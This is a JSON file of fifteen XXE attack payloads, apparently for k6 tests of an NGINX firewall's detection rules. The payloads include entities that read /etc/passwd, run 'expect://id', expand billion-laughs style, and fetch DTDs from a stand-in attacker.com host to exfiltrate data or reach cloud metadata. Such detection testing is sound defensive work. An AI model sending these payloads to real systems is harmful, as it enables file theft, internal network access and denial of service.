{
  "metadata": {
    "category": "xxe",
    "total_patterns": 15,
    "port": 8007,
    "description": "k6 test patterns for XXE attacks"
  },
  "patterns": [
    {
      "id": "XXE_ENTITY_001",
      "name": "XXE external entity file disclosure",
      "category": "xxe",
      "subcategory": "entity_injection",
      "payload": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
      "encoded": "%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
    },
    {
      "id": "XXE_ENTITY_002",
      "name": "XXE external DTD parameter entity",
      "category": "xxe",
      "subcategory": "entity_injection",
      "payload": "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">",
      "encoded": "%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection"
    },
    {
      "id": "XXE_ENTITY_003",
      "name": "XXE expect wrapper command execution",
      "category": "xxe",
      "subcategory": "entity_injection",
      "payload": "<!ENTITY xxe SYSTEM \"expect://id\">",
      "encoded": "%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection"
    },
    {
      "id": "XXE_ENTITY_004",
      "name": "XXE PHP filter base64 encoding",
      "category": "xxe",
      "subcategory": "entity_injection",
      "payload": "<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">",
      "encoded": "%3C!ENTITY%20%25%20file%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection"
    },
    {
      "id": "XXE_ENTITY_005",
      "name": "XXE data URI scheme injection",
      "category": "xxe",
      "subcategory": "entity_injection",
      "payload": "<!ENTITY xxe SYSTEM \"data:text/plain;base64,dGVzdA==\">",
      "encoded": "%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection"
    },
    {
      "id": "XXE_BILLION_001",
      "name": "XXE billion laughs DoS attack",
      "category": "xxe",
      "subcategory": "entity_expansion",
      "payload": "<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">",
      "encoded": "%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol2%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection"
    },
    {
      "id": "XXE_JAR_001",
      "name": "XXE JAR protocol remote code execution",
      "category": "xxe",
      "subcategory": "protocol_abuse",
      "payload": "<!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/\">",
      "encoded": "%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection"
    },
    {
      "id": "XXE_NETDOC_001",
      "name": "XXE netdoc protocol file access",
      "category": "xxe",
      "subcategory": "protocol_abuse",
      "payload": "<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">",
      "encoded": "%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E",
      "port": 8007,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Traversal] File inclusion attack detected"
    },
    {
      "id": "XXE_BLIND_001",
      "name": "Blind XXE with External DTD",
      "category": "xxe",
      "subcategory": "blind_xxe",
      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]>",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "Blind XXE using external DTD to exfiltrate data",
      "encoded": "%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E"
    },
    {
      "id": "XXE_BLIND_002",
      "name": "Blind XXE with Parameter Entity DTD",
      "category": "xxe",
      "subcategory": "blind_xxe",
      "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "Blind XXE using parameter entity to load external DTD",
      "encoded": "%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%25xxe%3B%5D%3E"
    },
    {
      "id": "XXE_PARAM_001",
      "name": "XXE Parameter Entity Chaining",
      "category": "xxe",
      "subcategory": "parameter_entity",
      "payload": "<!DOCTYPE foo [<!ENTITY % data SYSTEM \"http://attacker.com/collect\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM '%data;'>\">%eval;]>",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "XXE parameter entity chaining for data exfiltration",
      "encoded": "%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E"
    },
    {
      "id": "XXE_SOAP_001",
      "name": "XXE in SOAP Envelope",
      "category": "xxe",
      "subcategory": "soap_xxe",
      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-service:8080/admin\">]><soap:Body>&xxe;</soap:Body>",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "XXE injection within SOAP XML body",
      "encoded": "%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Finternal-service%3A8080%2Fadmin%22%3E%5D%3E%3Csoap%3ABody%3E%26xxe%3B%3C%2Fsoap%3ABody%3E"
    },
    {
      "id": "XXE_SVG_001",
      "name": "XXE in SVG Image Upload",
      "category": "xxe",
      "subcategory": "svg_xxe",
      "payload": "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://169.254.169.254/meta-data\">]><svg xmlns=\"http://www.w3.org/2000/svg\">&xxe;</svg>",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "XXE injection via SVG file format",
      "encoded": "%3C%21DOCTYPE%20svg%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F169.254.169.254%2Fmeta-data%22%3E%5D%3E%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%26xxe%3B%3C%2Fsvg%3E"
    },
    {
      "id": "XXE_ENCODE_001",
      "name": "XXE with Internal Entity Declaration",
      "category": "xxe",
      "subcategory": "encoded_xxe",
      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"sensitive-data\">]><root>&xxe;</root>",
      "port": 80,
      "expected_detection": true,
      "severity": "medium",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "XXE with internal entity declaration",
      "encoded": "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20%22sensitive-data%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E"
    },
    {
      "id": "XXE_SSRF_001",
      "name": "XXE SSRF to Cloud Metadata",
      "category": "xxe",
      "subcategory": "xxe_ssrf",
      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX XXE Attack] DOCTYPE/ENTITY injection",
      "description": "XXE combined with SSRF targeting cloud metadata",
      "encoded": "%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E"
    }
  ]
}
